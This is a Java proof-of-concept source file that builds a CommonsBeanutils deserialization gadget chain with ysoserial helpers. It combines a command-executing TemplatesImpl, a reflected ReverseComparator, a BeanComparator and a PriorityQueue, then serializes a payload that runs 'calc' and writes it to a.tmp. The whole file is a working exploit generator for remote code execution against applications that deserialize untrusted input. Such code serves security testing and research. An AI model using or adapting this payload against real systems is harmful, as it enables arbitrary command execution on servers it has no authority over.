package com.tapestry.poc;

import com.nqzero.permit.Permit;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.util.Gadgets;

import java.io.*;
import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils2 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void setAccessible(AccessibleObject member) {
        // quiet runtime warnings from JDK9+
        Permit.setAccessible(member);
    }

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        setAccessible(ctor);
        return ctor;
    }

//    public static Object createTemplatesImpl() throws Exception {
//        TemplatesImpl templates = TemplatesImpl.class.newInstance();
//
//        ClassPool classPool = ClassPool.getDefault();
//        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
//        Class cls = Exp.class;
//        classPool.insertClassPath(new ClassClassPath(cls));
//        CtClass clazz = classPool.get(cls.getName());
//        CtClass superC = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
//        clazz.setSuperclass(superC);
//        final byte[] classBytes = clazz.toBytecode();
//
//
//        setFieldValue(templates, "_bytecodes", new byte[][]{ classBytes });
//        setFieldValue(templates, "_name", "aaa");
//        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
//
//        return templates;
//    }


    public static Object getObject(String command) throws Exception {

        final Object templates = Gadgets.createTemplatesImpl(command);

        Constructor constructor = getFirstCtor("java.util.Collections$ReverseComparator");
        setAccessible(constructor);
        Object obj = constructor.newInstance();

        final BeanComparator comparator = new BeanComparator(null, (Comparator) obj);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;

    }


    public static void main(String[] args) throws Exception {
        Object obj = getObject("calc");
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();

        byte[] bytes = barr.toByteArray();
        FileOutputStream os = new FileOutputStream("a.tmp");
        os.write(bytes);
        os.close();
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
//        ois.readObject();
    }
}